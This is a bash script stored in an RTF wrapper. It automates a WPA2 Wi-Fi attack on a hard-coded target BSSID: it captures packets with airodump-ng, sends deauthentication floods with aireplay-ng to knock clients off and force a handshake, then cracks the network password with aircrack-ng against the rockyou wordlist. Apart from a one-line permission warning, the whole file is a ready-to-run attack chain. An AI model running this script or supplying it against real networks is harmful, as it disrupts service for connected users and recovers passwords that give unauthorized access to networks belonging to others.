{\rtf1\ansi\ansicpg1252\cocoartf2821
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\froman\fcharset0 Times-Roman;\f1\froman\fcharset0 Times-Italic;}
{\colortbl;\red255\green255\blue255;\red214\green85\blue98;\red0\green0\blue0;\red74\green80\blue93;
\red81\green157\blue235;\red136\green185\blue102;\red197\green136\blue83;}
{\*\expandedcolortbl;;\cssrgb\c87843\c42353\c45882;\cssrgb\c0\c0\c0;\cssrgb\c36078\c38824\c43922;
\cssrgb\c38039\c68627\c93725;\cssrgb\c59608\c76471\c47451;\cssrgb\c81961\c60392\c40000;}
\margl1440\margr1440\vieww11520\viewh8400\viewkind0
\deftab720
\pard\pardeftab720\partightenfactor0

\f0\fs24 \cf2 \expnd0\expndtw0\kerning0
\outl0\strokewidth0 \strokec2 #!/bin/bash\cf0 \strokec3  \
\pard\pardeftab720\partightenfactor0

\f1\i \cf4 \strokec4 # WiFi Security Assessment - WPA2 Handshake Capture and Crack
\f0\i0 \cf0 \strokec3  \

\f1\i \cf4 \strokec4 # WARNING: Only use on networks you own or have permission to test
\f0\i0 \cf0 \strokec3  \

\f1\i \cf4 \strokec4 # Configuration - MODIFY THESE VALUES
\f0\i0 \cf0 \strokec3  \
\
\pard\pardeftab720\partightenfactor0
\cf5 \strokec5 TARGET_BSSID=\cf6 \strokec6 "F0:A7:31:27:EC:FB"\cf0 \strokec3  
\f1\i \cf4 \strokec4 # Replace with your target
\f0\i0 \cf0 \strokec3  \
\cf5 \strokec5 CHANNEL=\cf6 \strokec6 "3"\cf0 \strokec3  
\f1\i \cf4 \strokec4 # Replace with target channel
\f0\i0 \cf0 \strokec3  \
\cf5 \strokec5 OUTPUT_FILE=\cf6 \strokec6 "wpa2_capture"\cf0 \strokec3  \
\cf5 \strokec5 WORDLIST=\cf6 \strokec6 "/usr/share/wordlists/rockyou.txt"\cf0 \strokec3  \
\
\pard\pardeftab720\partightenfactor0
\cf7 \strokec7 echo\cf0 \strokec3  \cf6 \strokec6 "=== WPA2 Security Assessment ==="\cf0 \strokec3  \
\cf7 \strokec7 echo\cf0 \strokec3  \cf6 \strokec6 "Target: \cf5 \strokec5 $TARGET_BSSID\cf6 \strokec6 "\cf0 \strokec3  \
\cf7 \strokec7 echo\cf0 \strokec3  \cf6 \strokec6 "Channel: \cf5 \strokec5 $CHANNEL\cf6 \strokec6 "\cf0 \strokec3  \
\cf7 \strokec7 echo\cf0 \strokec3  \cf6 \strokec6 ""\cf0 \strokec3  \
\
\cf7 \strokec7 echo\cf0 \strokec3  \cf6 \strokec6 "Step 1: Capturing handshake..."\cf0 \strokec3  \
\cf7 \strokec7 echo\cf0 \strokec3  \cf6 \strokec6 "Starting packet capture (press Ctrl+C in other terminal after handshake)"\cf0 \strokec3  \
\pard\pardeftab720\partightenfactor0
\cf5 \strokec5 sudo\cf0 \strokec3  airodump-ng -c \cf5 \strokec5 $CHANNEL\cf0 \strokec3  --bssid \cf5 \strokec5 $TARGET_BSSID\cf0 \strokec3  -w \cf5 \strokec5 $OUTPUT_FILE\cf0 \strokec3  wlan0mon \cf5 \strokec5 &\cf0 \strokec3  \
\
\cf5 \strokec5 sleep\cf0 \strokec3  \cf7 \strokec7 5\cf0 \strokec3  \
\
\pard\pardeftab720\partightenfactor0
\cf7 \strokec7 echo\cf0 \strokec3  \cf6 \strokec6 "Step 2: Sending deauthentication packets..."\cf0 \strokec3  \
\pard\pardeftab720\partightenfactor0
\cf5 \strokec5 sudo\cf0 \strokec3  aireplay-ng -0 \cf7 \strokec7 10\cf0 \strokec3  -a \cf5 \strokec5 $TARGET_BSSID\cf0 \strokec3  wlan0mon \
\
\pard\pardeftab720\partightenfactor0
\cf7 \strokec7 echo\cf0 \strokec3  \cf6 \strokec6 "Step 3: Attempting to crack password..."\cf0 \strokec3  \
\cf7 \strokec7 echo\cf0 \strokec3  \cf6 \strokec6 "This may take a while depending on password complexity..."\cf0 \strokec3  \
\pard\pardeftab720\partightenfactor0
\cf5 \strokec5 sudo\cf0 \strokec3  aircrack-ng \cf5 \strokec5 $OUTPUT_FILE\cf0 \strokec3 -01.cap -w \cf5 \strokec5 $WORDLIST}